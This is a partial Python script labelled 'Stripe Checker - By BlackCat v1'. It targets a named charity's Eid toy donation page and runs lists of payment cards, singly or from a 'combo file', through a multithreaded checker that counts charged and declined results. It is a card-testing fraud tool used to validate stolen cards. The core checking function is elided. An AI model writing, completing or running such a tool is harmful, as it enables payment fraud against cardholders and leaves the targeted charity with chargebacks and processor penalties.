...
SITE_URL = 'https://hijrah.org/donations/eid-toy/'
BASE_URL = 'https://hijrah.org'
CLEAN_URL = 'https://hijrah.org/donations/eid-toy/'
...
def main():
    print(banner)
    print('    Stripe Checker - By BlackCat v1')
    print()
    print('  [1] Single Card')
    print('  [2] Combo File')
    print()
    ...
    if choice == '1':
        ...
        if not os.path.exists(fpath):
            ...
            return
        try:
            threads_input = input('  Enter thread input (e.g. 5): ').strip()
            max_threads = int(threads_input) if threads_input else 5
        except ValueError:
            max_threads = 5
        ...
        def worker(i, card):
            nonlocal charged, declined, errors
            result = check_card(card)
            ...
            with lock:
                ...
                print(f'  {i}/{len(cards)}... | {status} | {result}')

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(worker, i, card) for i, card in enumerate(cards, 1)]
